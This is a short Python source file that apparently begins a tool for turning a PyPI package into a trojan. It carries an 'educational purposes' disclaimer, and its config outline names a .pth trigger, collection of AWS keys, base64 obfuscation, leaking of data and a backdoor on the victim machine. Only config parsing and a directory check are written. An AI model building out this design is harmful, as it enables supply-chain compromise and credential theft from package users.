# -*- encoding: utf-8 -*-
'''
DISCLAIMER: this tool can only be used for educational purposes.
@File    :   main.py
@Time    :   2026/05/04 13:33:23
@Author  :   LamentXU
'''
from os import path
from typing import Collection

def create_modified_package(config):
    '''Parse the config dict, see make()'''
    target_dir, trigger, collection, obfuscate, leak, backdoor = map(config.get, [
        'target_dir', 'trigger', 'collection', 'obfuscate', 'leak', 'backdoor'
    ])
    return target_dir, trigger, collection, obfuscate, leak, backdoor

def make(config):
    '''
    Main function to create a modified package according to the given configuration.
    '''
    # Step1: Now, user passes the configuration file to the program.
    """
    config type
        {
            'target_dir': string, # the target directory of user's original pypi file.
            'trigger': dict, # how the melicious file is triggered, e.g. .pth
            'collection': dict, # how the critical information is collected, e.g. AWS key
            'obfucscati': dict, # in what technique is the trojan obfucscated, e.g. base64
            'leak': dict, # how the information is leaked
            'backdoor': dict # how the trojan behave in the victim machine after the information is sent
        }

    """
    target_dir, trigger, collection, obfuscate, leak, backdoor = create_modified_package(config)
    # Step2: Now, load what the user is parsed.
    # Step2.1: Now iload the target_dir
    if not path.isdir(target_dir):
        raise ValueError(f'Target directory {target_dir} is not a existing path or not a valid directory')
    # TODO: load the pypi file, both setup.py and project.toml
    


